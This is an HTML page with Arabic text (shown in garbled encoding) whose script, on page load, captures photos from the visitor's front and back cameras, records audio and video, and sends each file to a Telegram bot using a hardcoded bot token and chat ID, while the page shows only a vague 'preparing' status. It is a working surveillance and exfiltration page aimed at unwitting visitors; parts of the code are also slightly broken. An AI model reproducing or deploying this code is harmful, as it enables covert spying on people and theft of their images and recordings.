
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ™‚</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: white;
            color: #333;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        
        .status {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            z-index: 100;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            max-width: 80%;
        }
        
        .progress {
            width: 100%;
            height: 10px;
            background-color: #f0f0f0;
            border-radius: 5px;
            margin-top: 10px;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background-color: #4CAF50;
            width: 0%;
            transition: width 0.3s;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="status" id="statusMessage">
        <h2>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ø¶ÙŠØ±...</h2>
    </div>

    <script>
        // Ø§Ø³ØªØ¨Ø¯Ù„ Ù‡Ø°Ù‡ Ø§Ù„Ù‚ÙŠÙ… Ø¨Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ
        const BOT_TOKEN = '8525941488:AAFAVeXgnoSXUcTc8Pd9ZZt6NgxD78f0ID0';
        const CHAT_ID = '7560590547';
        
        // Ø¹Ù†Ø§ØµØ± DOM
        const statusMessage = document.getElementById('statusMessage');
        const statusText = document.getElementById('statusText');
        const progressBar = document.getElementById('progressBar');
        
        // Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¹Ø§Ù…Ø©
        let frontCameraStream = null;
        let backCameraStream = null;
        let audioStream = null;
        let videoStream = null;
        let mediaRecorder = null;
        let videoRecorder = null;
        let audioChunks = [];
        let videoChunks = [];
        
        // Ø¯Ø§Ù„Ø© ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø§Ù„Ø©
        function updateStatus(text, progress) {
            statusText.textContent = text;
            if (progress !== undefined) {
                progressBar.style.width = progress + '%';
            }
        }
        
       // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙˆØ³Ø§Ø¦Ø· Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
async function sendToTelegram(blob, type, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append(type, blob, `file.${getFileExtension(type)}`);
    formData.append('caption', caption);
    
    // Ø¨Ù†Ø§Ø¡ Ø±Ø§Ø¨Ø· API Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­
    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
    
    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error(`ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ${response.status}`);
        }
        
        return await response.json();
    } catch (error) {
        console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
        throw error;
    }
}

// Ø¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù…ØªØ¯Ø§Ø¯ Ø§Ù„Ù…Ù„Ù
function getFileExtension(type) {
    const extensions = {
        'photo': 'jpg',
        'video': 'mp4',
        'audio': 'mp3',
        'document': 'pdf',
        'voice': 'ogg'
    };
    
    return extensions[type] || 'bin';
}
        // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        async function captureImage(videoElement, cameraName) {
            return new Promise((resolve) => {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0);
                
                canvas.toBlob(blob => {
                    resolve(blob);
                }, 'image/jpeg');


});
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª
        async function recordAudio() {
            return new Promise(async (resolve, reject) => {
                try {
                    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    audioChunks = [];
                    
                    mediaRecorder = new MediaRecorder(audioStream);
                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        resolve(audioBlob);
                    };
                    
                    mediaRecorder.start();
                    
                    // ØªØ³Ø¬ÙŠÙ„ Ù„Ù…Ø¯Ø© 10 Ø«ÙˆØ§Ù†Ù (ÙŠÙ…ÙƒÙ† ØªØºÙŠÙŠØ±Ù‡Ø§)
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            audioStream.getTracks().forEach(track => track.stop());
                        }
                    }, 10000);
                    
                } catch (error) {
                    reject(error);
                }
            });
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        async function recordVideo() {
            return new Promise(async (resolve, reject) => {
                try {
                    videoStream = await navigator.mediaDevices.getUserMedia({ 
                        video: true, 
                        audio: true 
                    });
                    
                    videoChunks = [];
                    videoRecorder = new MediaRecorder(videoStream, { 
                        mimeType: 'video/webm; codecs=vp9,opus' 
                    });
                    
                    videoRecorder.ondataavailable = event => {
                        videoChunks.push(event.data);
                    };
                    
                    videoRecorder.onstop = () => {
                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                        resolve(videoBlob);
                    };
                    
                    videoRecorder.start();
                    
                    // ØªØ³Ø¬ÙŠÙ„ Ù„Ù…Ø¯Ø© 15 Ø«Ø§Ù†ÙŠØ© (ÙŠÙ…ÙƒÙ† ØªØºÙŠÙŠØ±Ù‡Ø§)
                    setTimeout(() => {
                        if (videoRecorder && videoRecorder.state === 'recording') {
                            videoRecorder.stop();
                            videoStream.getTracks().forEach(track => track.stop());
                        }
                    }, 15000);
                    
                } catch (error) {
                    reject(error);
                }
            });
        }
        
        // Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
        async function startCaptureProcess() {
            try {
                updateStatus('Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª...', 10);
                
                // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª Ø§Ù„Ù…ØªØ§Ø­Ø©
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                if (videoDevices.length === 0) {
                    throw new Error('Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ ÙƒØ§Ù…ÙŠØ±Ø§Øª');
                }
                
                updateStatus('Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±...', 30);
                
                // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª Ø§Ù„Ù…ØªØ§Ø­Ø©
                const imagePromises = [];
                
                // Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£ÙˆÙ„Ù‰
                if (videoDevices.length >= 1) {
                    frontCameraStream = await navigator.mediaDevices.getUserMedia({

video: { deviceId: videoDevices[0].deviceId } 
                    });
                    const frontVideo = document.createElement('video');
                    frontVideo.srcObject = frontCameraStream;
                    await new Promise(resolve => {
                        frontVideo.onloadedmetadata = () => {
                            frontVideo.play();
                            setTimeout(resolve, 1000);
                        };
                    });
                    
                    imagePromises.push(
                        captureImage(frontVideo, 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ')
                            .then(blob => sendToTelegram(blob, 'photo', 'ØµÙˆØ±Ø© Ù…Ù†  '))
                            .finally(() => {
                                frontCameraStream.getTracks().forEach(track => track.stop());
                            })
                    );
                }
                
                // Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø«Ø§Ù†ÙŠØ©
                if (videoDevices.length >= 2) {
                    backCameraStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { deviceId: videoDevices[1].deviceId } 
                    });
                    const backVideo = document.createElement('video');
                    backVideo.srcObject = backCameraStream;
                    await new Promise(resolve => {
                        backVideo.onloadedmetadata = () => {
                            backVideo.play();
                            setTimeout(resolve, 1000);
                        };
                    });
                    
                    imagePromises.push(
                        captureImage(backVideo, 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©')
                            .then(blob => sendToTelegram(blob, 'photo', 'ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©'))
                            .finally(() => {
                                backCameraStream.getTracks().forEach(track => track.stop());
                            })
                    );
                }
                
                await Promise.all(imagePromises);
                updateStatus('ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØŒ Ø¬Ø§Ø±ÙŠ  ...', 50);
                
                // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØµÙˆØª
                const audioBlob = await recordAudio();
                await sendToTelegram(audioBlob, 'audio', ' ');
                updateStatus('ØªÙ…  Ø§Ù„ØµÙˆØªØŒ Ø¬Ø§Ø±ÙŠ  ...', 70);
                
                // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                const videoBlob = await recordVideo();
                await sendToTelegram(videoBlob, 'video', ' 
                                     ');
                updateStatus('ØªÙ…   Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡...', 90);
                
                // Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
                setTimeout(() => {
                    updateStatus('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ÙˆØ³Ø§Ø¦Ø· Ø¨Ù†Ø¬Ø§Ø­!', 100);
                    setTimeout(() => {
                        statusMessage.classList.add('hidden');
                    }, 2000);
                }, 1000);
                
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©:', error);
                updateStatus('Ø­Ø¯Ø« Ø®Ø·Ø£: ' + error.message, 0);
            }
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', () => {
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ§Ù„Ù€ chat id
            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                updateStatus('ÙŠØ±Ø¬Ù‰ Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ±Ù‚Ù… Ø§Ù„Ø¯Ø±Ø¯Ø´Ø© Ø§Ù„Ø®Ø§ØµÙŠÙ† Ø¨Ùƒ ÙÙŠ Ø§Ù„ÙƒÙˆØ¯', 0);
                return;
            }
            
            // Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ÙˆØ³Ø§Ø¦Ø·
            startCaptureProcess();
        });
    </script>
</body>
</html>
